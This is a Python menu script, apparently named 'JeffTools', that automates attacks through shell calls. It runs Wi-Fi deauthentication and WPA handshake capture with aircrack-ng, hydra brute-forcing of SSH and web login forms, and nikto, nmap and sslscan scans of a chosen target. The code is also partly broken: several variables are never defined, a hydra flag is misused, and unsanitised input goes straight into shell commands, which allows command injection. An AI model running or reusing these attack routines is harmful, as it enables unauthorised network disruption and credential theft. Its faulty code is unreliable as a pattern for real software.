import os

os.system('clear')



print("------------------------------------------")
print("1) airscript")
print("2) cracker   | SSH")
print("3) cracker   | http/https")
print("4) AMFinder")
print("5) nmapper")
print("6) sslscan")
print("------------------------------------------")

tool = input("Enter the tool u want to use(ctrl + C to exit): ")



def Function_airscript():
    os.system('airmon-ng check kill')
    os.system('clear')

    print("Automated Aircrack-ng tool By Jeffrey")
    print("-------------------------------------------")

    interface = input("Type interface: ")
    print("-------------------------------------------")
    print("Interface set to: " + interface)
    print("-------------------------------------------")
    input("Press Enter to continue")

    os.system('clear')

    input("Press Enter to start monitor mode")
    print("-------------------------------------------")

    os.system('airmon-ng start ' + interface)

    print("-------------------------------------------")
    input("Press enter to continue")


    os.system('airodump-ng ' + interface + 'mon')
    input("Press enter to continue")



    os.system('clear')


    os.system('airodump-ng --bssid ' + bssid + ' -c ' + channel + ' --write WPAcrack mon0')
    print("-------------------------------------------")
    input("Press enter to continue")

    deauth = input("Enter the number of de-authenticate frames you want to send (example: 100): ")

    os.system('aireplay-ng --deauth ' + deauth + ' -a ' + bssid + ' mon0')

    os.system('JeffTools')



def Function_cracker_ssh():
    import os


    def ssh(wrdList, Host):
          os.system('hydra -L ' + wrdList + ' -P ' + wrdList + ' ' + Host + ' ssh')




    path = input("Enter the path of the Wordlist: ")
    print("------------------------------------------")
    print("Path set to: " + path)
    print("------------------------------------------")
    input("Press enter to continue")

    os.system('clear')

    ip = input("Enter Target ip: ")
    print("------------------------------------------")
    print("Set ip to: " + ip)
    print("------------------------------------------")
    input("Press enter to start attack")

    os.system('clear')


    ssh(path, ip)

    os.system('JeffTools')



def Function_AMFinder():
    import os


    os.system('clear')


    print("----------------------------------------------------------------")
    print("|  Welcome to AdminFinder an automated nikto tool by Jeffrey   |")
    print("----------------------------------------------------------------")

    url = input("Enter Host/url: ")

    os.system('clear')


    print("----------------------------------------------------------------")
    print("|  Welcome to AdminFinder an automated nikto tool by Jeffrey   |")
    print("----------------------------------------------------------------")
    print("----------------------------------------------------------------")
    print("|  Set host to: " + url)
    print("----------------------------------------------------------------")

    input("Press enter to start scanning: " + url)


    os.system('clear')

    os.system('nikto -host ' + url)
    os.system('JeffTools')


def Function_nmapper():
    import os

    os.system('clear')


    ip = input("Enter Target ip(Ctrl + c to exit): ")
    os.system('clear')
    print("-----------------------------")
    print("Target Ip set to: " + ip)
    print("-----------------------------")

    os.system('clear')



    def Function_IP_protocol(host):
        os.system('nmap -sO ' + host)
        input("Press enter to go back")
        os.system('nmapper')


    def Function_Service_Version(host):
        os.system('nmap -sV ' + host)
        input("Press enter to go back")
        os.system('nmapper')

    def Function_All_Hosts(host):
        os.system('nmap -sV ' + host + ' -Pn')
        os.system("Press enter to go back")
        os.system('nmapper')


    def Function_Exit():
    	os.system('exit')




    print("Ip: " + ip)
    print("--------------------------------")
    print("Choose option")
    print("--------------------------------")
    print("1) Ip Protocol")
    print("2) Service/Version")
    print("3) All Hosts (slow)")
    print("4) Exit")
    print("--------------------------------")

    oP = input("Choose option: ")


    os.system('clear')



    if oP == "1":
        Function_IP_protocol(ip)

    elif oP == "2":
        Function_Service_Version(ip)

    elif oP == "3":
        Function_All_Hosts(ip)

    elif oP == "4":
        Function_Exit()

    else:
        print("This Number is invalid.")


    os.system('JeffTools')



def Function_cracker_http():
    import os



    username = input("Enter username:")
    print("---------------------------")
    print("Set Username to: " + username)
    print("---------------------------")

    cmd = 'clear'
    os.system(cmd)

    ip = input("Enter Ip:")
    print("---------------------------")
    print("Set ip to: " + ip)
    print("---------------------------")

    cmd = 'clear'
    os.system(cmd)

    method = "http-post-form"

    location = input("Specify path to attack:")
    print("---------------------------")
    print("Set path to: " + location)
    print("---------------------------")

    cmd = 'clear'
    os.system(cmd)


    fail = input("Enter Failure Message: ")
    print("----------------------------")
    print("Set message to: " + fail)
    print("----------------------------")

    os.system(cmd)

    wordls = input("Enter the path of the wordlist: ")
    print("----------------------------")
    print("set wordlist to: " + wordls)
    print("----------------------------")
    input("Press enter to start attack")

    os.system(cmd)



    hydra1 = 'sudo hydra -l '
    hydra2 = ' -p '
    hydra3 = ' "'
    hydra4 = ':username='
    hydra5 = '&password=^PASS^:'
    hydra6 = '"'

    os.system(hydra1 + username + hydra2 + wordls + ' ' + ip + ' ' + method + hydra3 + location + hydra4 + username + hydra5 + fail + hydra6)




def Function_sslscan():
    print("----------------------------------------")
    print("|Welcome to the automated sslscan tool |")
    print("----------------------------------------")
    print("The IPVersion is currently set to: " + ipver)
    print("-----------------")
    print("The host is currently set to: " + target)

    cmd = input("sslscan>")


    def Function_Start_sslscan(ipv, host):
        os.system('sslscan ' + ipv + ' ' + host)

    if cmd == 'set ipversion':
        ipver = input("Choose '-4' for an IPV4 or use '-6' for an IPV6:")
    elif cmd == 'set host':
        target = input("Host Adress: ")
    elif cmd == 'run':
        Function_Start_sslscan(ipver, target)
    else:
        input('Invalid Command')
        Function_sslscan()






if tool == "1":
    Function_airscript()

elif tool =="2":
    Function_cracker_ssh()

elif tool == "3":
    Function_cracker_http()

elif tool == "4":
    Function_AMFinder()

elif tool == "5":
    Function_nmapper()

elif tool == "6":
    Function_sslscan()

else:
    print("Invalid number pls try again")
    os.system('JeffTools')
